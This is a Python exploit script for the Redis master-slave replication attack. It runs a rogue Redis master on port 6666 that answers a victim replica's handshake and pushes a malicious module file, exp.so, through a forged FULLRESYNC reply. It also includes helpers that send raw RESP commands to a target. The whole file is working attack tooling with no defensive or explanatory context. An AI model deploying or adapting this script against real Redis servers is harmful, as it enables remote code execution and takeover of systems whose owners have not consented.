#!/usr/local/bin python
#coding=utf-8
import socket

CRLF = "\r\n"

def redis_format(arr):
    redis_arr = arr.split(" ")
    cmd = "*" + str(len(redis_arr))
    for x in redis_arr:
        cmd += CRLF + "$" + str(len(x)) + CRLF + x
    cmd += CRLF
    return cmd.encode("utf-8")

def redis_connect(rhost, rport):
    sock = socket.socket()
    sock.connect((rhost, rport))
    return sock

def send(sock, cmd):
    sock.send(redis_format(cmd))
    print(sock.recv(1024).decode("utf-8"))

def RogueServer(lport):
    with open("exp.so", "rb") as f:
        payload = f.read()
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("0.0.0.0", lport))
    sock.listen(10)
    print(f"\033[92m[+]\033[0m Listening on port {lport}...")
    
    clientSock, address = sock.accept()
    print(f"\033[92m[+]\033[0m Accepted connection from {address[0]}:{address[1]}")
    
    while True:
        data = clientSock.recv(1024).decode("utf-8", errors="ignore")
        if "PING" in data:
            clientSock.send(b"+PONG" + CRLF.encode())
        elif "REPLCONF" in data:
            clientSock.send(b"+OK" + CRLF.encode())
        elif "PSYNC" in data or "SYNC" in data:
            response = b"+FULLRESYNC " + b"a" * 40 + b" 1" + CRLF.encode()
            response += b"$" + str(len(payload)).encode() + CRLF.encode()
            response += payload + CRLF.encode()
            clientSock.send(response)
            print("\033[92m[+]\033[0m FULLRESYNC ...")
            break
    
    print("\033[92m[+]\033[0m It's done")
    clientSock.close()
    sock.close()
    
if __name__ == "__main__":
    lport = 6666
    RogueServer(lport)
